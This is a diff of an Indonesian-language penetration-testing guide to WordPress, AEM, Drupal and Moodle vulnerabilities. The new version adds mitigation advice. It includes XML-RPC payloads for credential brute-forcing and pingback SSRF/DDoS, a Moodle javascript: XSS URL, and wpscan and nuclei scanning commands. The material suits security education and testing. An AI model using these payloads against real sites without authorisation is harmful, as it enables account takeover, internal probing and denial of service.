@@ -1,93 +1,114 @@
-# CMS (Content Management System)
-## Definisi
+# ⚙️ CMS (Content Management System) Vulnerabilities
 
-Content Management System (CMS) adalah sebuah platform software yang yang memungkinkan pengguna untuk membangun dan mengelola situs web dengan pengetahuan dan sumber daya teknis yang terbatas. Ini memungkinkan pengguna untuk membuat, mengelola, dan memodifikasi konten di situs web dengan Graphic User Interface (GUI) yang membuat interaksi menjadi user friendly tanpa memerlukan pengetahuan teknis apa pun.
+## 1. Definisi
+**Content Management System (CMS)** adalah platform perangkat lunak yang memungkinkan pengguna untuk membuat, mengelola, dan mempublikasikan konten di situs web dengan mudah melalui antarmuka grafis (GUI) tanpa perlu menulis kode dari nol. Platform populer seperti WordPress, Drupal, Moodle, dan Adobe Experience Manager (AEM) menguasai sebagian besar ekosistem web global.
 
-## Beberapa Platform yang **Mungkin** rentan akan CMS
-1. [Wordpress](https://github.com/rad1zly/penetration-testing/blob/main/Teknik-Serangan/CMS/README.md#teknik-serangan-pada-platform-wordpress)
-2. [Adobe Experience Manager](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-adobe-experience-manager)
-3. [Drupal](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-drupal)
-4. [Moodle](https://github.com/rad1zly/penetration-testing/tree/main/Teknik-Serangan/CMS#teknik-serangan-pada-platform-moodle)
+Karena kepopulerannya, CMS sering kali menjadi target serangan utama. Kerentanan pada CMS biasanya disebabkan oleh:
+* Penggunaan plugin atau tema pihak ketiga yang tidak aman.
+* Miskonfigurasi keamanan sistem (seperti membiarkan file administrasi terbuka).
+* Tidak memperbarui versi CMS core atau komponen pendukungnya secara berkala.
 
-## Teknik Serangan pada platform Wordpress
-Berikut merupakan beberapa *security misconfiguration* yang biasa terjadi pada platform Wordpress beserta *tools* yang bisa digunakan untuk mendeteksi terjadinya kerentanan tersebut. 
+---
 
-### Tool untuk deteksi
-1. [Wappalyzer](https://www.wappalyzer.com/)
-2. [WhatRuns](https://www.whatruns.com/)
-3. [BuildWith](https://builtwith.com/)
-4. [WpScan](https://github.com/wpscanteam/wpscan)
-5. [XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)
+## 2. Pengujian & Eksploitasi Platform CMS Populer
 
-### xmlrpc.php
-Ini merupakan kerentanan paling umum pada wordpress, cara mendeteksi kerentanan tersebut adalah sebagai berikut :
-* kunjungi site dari ```siteyangdituju.com/xmlrpc.php```
-* Mendapatkan pesan error tentang *POST request only*
+### 🅰️ 1. WordPress
+WordPress adalah CMS paling populer di dunia. Dua titik pengujian paling umum:
 
-Kemudian berikut cara melakukan exploitnya:
-* Lakukan *intercept* pada *request* dan ubah *method* GET ke POST
-* Kemudian masukan payload ini saat POST untuk melihat semua *Method* yang bisa digunakan
-    ```
-    <methodCall>
-    <methodName>system.listMethods</methodName>
-    <params></params>
-    </methodCall>
-    ```
-* Lihat apabila ada *method* ```pingback.ping``` pada list yang ditampilkan
-* Jika ada *method* diatas maka bisa dilakukan DDoS dengan *payload* berikut:
-    ```
-    <methodCall>
-    <methodName>pingback.ping</methodName>
-    <params><param>
-    <value><string>http://<IP SERVER ANDA>:<port></string></value>
-    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
-    </value></param></params>
-    </methodCall>
-    ```
-* Selain itu juga bisa dilakukan serangan SSRF (Khusus untuk port internal) dengan payload berikut:
-    ```
-    <methodCall>
-    <methodName>pingback.ping</methodName>
-    <params><param>
-    <value><string>http://<IP SERVER ANDA>:<port></string></value>
-    </param><param><value><string>http://<ALAMAT HOST YANG DIUJI></string>
-    </value></param></params>
-    </methodCall>
-    ```
-
-## Teknik Serangan pada platform Adobe Experience Manager (AEM)
-Berikut merupakan teknik serangan pada platform Adobe Experience Manager (AEM)
-### Tools yang bisa digunakan untuk mendeteksi
-+ [aem-hacker](https://github.com/0ang3el/aem-hacker)
-+ [aemscan](https://github.com/Raz0r/aemscan)
-
-### Wordlist untuk melakukan *fuzzing* AEM
-+ [wordlist_aem.txt](https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths)
-
-### Sumber
-+ *[Approaching AEM](https://www.bugcrowd.com/resources/webinar/aem-hacker-approaching-adobe-experience-manager-web-apps/)*
-+ [Teknik Mengamankan AEM](https://www.slideshare.net/0ang3el/securing-aem-webapps-by-hacking-them)
-
-## Teknik Serangan pada platform Drupal
-Berikut merupakan teknik serangan pada platform Drupal. Lakukan *fuzzing* dengan menggunakan *intruder* pada Burpsuite pada ```/node/$``` dimana ```'$'``` adalah sebuah nomor (contohnya dari 1 hingga 1000 misalnya). Dari sana anda memungkinkan menemukan halaman tersembunyi seperti test, dev, admin, dan lain sebagainya yang tidak bisa dilihat dari *search engine*.
-### Sumber
-+ [Drupal](https://0xblackbird.github.io/blog/post1)
-## Teknik Serangan pada platform Moodle
-Berikut merupakan teknik serangan pada platform Moodle.
-### Tool untuk deteksi
-1. [Wappalyzer](https://www.wappalyzer.com/)
-2. [WhatRuns](https://www.whatruns.com/)
-3. [BuildWith](https://builtwith.com/)
-
-### Payload Exploit
-Berikut merupakan payload exploit yang bisa digunakan saat menemukan platform Moodle.
-* Menginjeksi XSS pada redirect url
-``` 
-https://MOODLE.TARGET.COM/mod/lti/auth.php?redirect_uri=javascript:alert(‘PAYLOAD’) 
+#### A. Pemindaian Otomatis menggunakan `WPScan`
+`wpscan` adalah alat bantu utama untuk mendeteksi kerentanan versi WordPress, tema, dan plugin yang terpasang.
+```bash
+# Scan dasar dengan deteksi plugin yang rentan
+wpscan --url http://target-wordpress.com --enumerate vp,vt,u
 ```
-* Menggunakan Template Nuclei -> [Moodle XSS Template](https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/moodle/moodle-xss.yaml)
+*(Parameter `vp` menanyakan plugin yang rentan, `vt` menanyakan tema yang rentan, `u` menanyakan daftar nama pengguna).*
 
-## Author
-**[rad1zly](https://github.com/rad1zly)**
+#### B. Eksploitasi `xmlrpc.php` (XML-RPC)
+API XML-RPC bawaan WordPress sering kali dibiarkan aktif. Celah ini dapat disalahgunakan untuk serangan brute-force massal atau SSRF.
 
+1. **Deteksi Awal**: Kunjungi `http://target.com/xmlrpc.php`. Jika muncul pesan `"XML-RPC server accepts POST requests only."`, maka API ini aktif.
+2. **Brute-Force Kredensial (Sangat Cepat)**:
+   Kirim POST request ke `/xmlrpc.php` dengan payload berikut:
+   ```xml
+   <methodCall>
+     <methodName>wp.getUsersBlogs</methodName>
+     <params>
+       <param><value><string>admin</string></value></param>
+       <param><value><string>PASSWORD_TEBAKAN</string></value></param>
+     </params>
+   </methodCall>
+   ```
+3. **SSRF & DDoS via XML-RPC Pingback**:
+   Mengarahkan pingback WordPress ke IP internal untuk mendeteksi port aktif atau ke server luar untuk DDoS:
+   ```xml
+   <methodCall>
+     <methodName>pingback.ping</methodName>
+     <params>
+       <param><value><string>http://IP_INTERNAL:PORT/</string></value></param>
+       <param><value><string>http://target.com/post-valid-wordpress</string></value></param>
+     </params>
+   </methodCall>
+   ```
 
+---
+
+### 🅱️ 2. Adobe Experience Manager (AEM)
+AEM adalah CMS kelas enterprise dari Adobe. Banyak instansi besar menggunakannya untuk portal utama.
+
+* **Alat Bantu Pemindaian**:
+  - [aem-hacker](https://github.com/0ang3el/aem-hacker) (Untuk mendeteksi miskonfigurasi servlet dan path sensitif).
+  - [aemscan](https://github.com/Raz0r/aemscan)
+* **Wordlist Jalur Sensitif AEM**:
+  Lakukan fuzzing direktori menggunakan daftar path khusus AEM seperti [wordlist_aem.txt](https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths) untuk menemukan endpoint konfigurasi OSGi console yang terbuka secara publik tanpa otentikasi.
+
+---
+
+### 🅲️ 3. Drupal
+Drupal adalah CMS modular yang aman, namun rentan jika konfigurasinya salah atau versinya usang (seperti celah legendaris *Drupalgeddon*).
+
+* **Teknik Fuzzing ID Node**:
+  Lakukan enumerasi halaman Drupal dengan melakukan fuzzing ID node pada URL `/node/$` (misalnya `/node/1` hingga `/node/1000`) menggunakan Burp Intruder. Hal ini sering mengungkap halaman draf, halaman development, atau dokumen administrasi internal yang tidak terindeks oleh mesin pencari.
+
+---
+
+### 🅳️ 4. Moodle
+Moodle adalah platform Learning Management System (LMS) berbasis web terpopuler di institusi pendidikan.
+
+* **Contoh Eksploitasi Open Redirect & XSS**:
+  Menyisipkan payload Javascript pada parameter `redirect_uri` di halaman otentikasi LTI:
+  ```http
+  https://moodle.target.com/mod/lti/auth.php?redirect_uri=javascript:alert('KamsibXSS')
+  ```
+* **Pemindaian dengan Nuclei**:
+  Gunakan template nuclei khusus untuk mendeteksi kerentanan Moodle secara otomatis:
+  ```bash
+  nuclei -u https://moodle.target.com -t vulnerabilities/moodle/
+  ```
+
+---
+
+## 3. Mitigasi (Pencegahan)
+
+### ✔️ 1. Matikan Layanan xmlrpc.php di WordPress
+Jika fitur XML-RPC tidak dibutuhkan (seperti untuk aplikasi mobile WordPress), matikan layanan ini dengan menambahkan aturan konfigurasi pada file `.htaccess`:
+```apache
+<Files xmlrpc.php>
+    Order Deny,Allow
+    Deny from all
+</Files>
+```
+Atau pasang plugin keamanan seperti Wordfence.
+
+### ✔️ 2. Lakukan Hardening & Isolasi Console Admin
+Pastikan konsol manajemen (seperti OSGi console di AEM, `/admin` di Drupal, `/wp-admin` di WordPress) tidak dapat diakses secara langsung dari IP publik internet. Gunakan pembatasan IP (IP Whitelisting) atau akses hanya via VPN internal perusahaan.
+
+### ✔️ 3. Update Berkala & Hapus Komponen Tidak Dipakai
+* Rutin lakukan pembaruan sistem *core* CMS dan seluruh plugin/tema.
+* Hapus secara permanen plugin atau tema yang dinonaktifkan (*disabled*) karena kode sumbernya masih bisa diakses secara langsung dan dieksploitasi jika memiliki kerentanan.
+
+---
+
+## 4. Referensi Terpercaya
+* [WPScan Official Database](https://wpscan.com/vulnerabilities)
+* [Securing AEM Web Applications by Hacking Them (Slideshare)](https://www.slideshare.net/0ang3el/securing-aem-webapps-by-hacking-them)
+* [Drupal Security Advisories](https://www.drupal.org/security)
